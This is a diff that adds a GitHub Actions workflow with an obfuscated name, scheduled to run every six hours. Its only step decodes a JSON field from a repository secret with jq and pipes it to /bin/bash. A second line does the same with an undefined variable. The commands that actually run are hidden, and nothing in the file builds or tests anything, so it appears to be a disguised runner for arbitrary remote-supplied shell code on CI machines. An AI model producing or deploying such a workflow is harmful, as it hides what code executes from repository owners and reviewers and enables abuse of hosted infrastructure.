@@ -1,0 +1,19 @@
+name: zhangcongrong6247
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangcongrong6247
+        env:
+          fdy61: ${{ secrets.fdy61 }}
+        run: |
+          echo $fdy61 | jq -r .vua52 | /bin/bash
+          echo $kv65307 | jq -r .hc1762 | /bin/bash
+
